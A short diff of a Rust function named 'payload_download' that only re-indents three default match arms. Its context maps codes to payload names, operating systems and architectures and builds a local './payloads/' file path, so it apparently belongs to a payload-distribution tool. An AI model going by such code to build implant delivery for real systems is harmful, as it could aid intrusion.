@@ -339,7 +339,7 @@ fn payload_download(strmod: u16) -> Vec<u8> {
         2 => "npc2",
         3 => "buut",
         4 => "desk",
-          _ => ""
+        _ => ""
     };
 
     let arch = match arch_digit{
@@ -350,7 +350,7 @@ fn payload_download(strmod: u16) -> Vec<u8> {
         5 => "mips64", 
         6 => "mips",
         7 => "loongarch64", 
-          _ => ""
+        _ => ""
     };
 
     let os = match os_digit{
@@ -360,7 +360,7 @@ fn payload_download(strmod: u16) -> Vec<u8> {
         4 => "android",
         5 => "ios", 
         6 => "ohos", 
-          _ => ""
+        _ => ""
     };
 
     let path = format!("./payloads/{}.{}.{}.dat", name, os, arch);
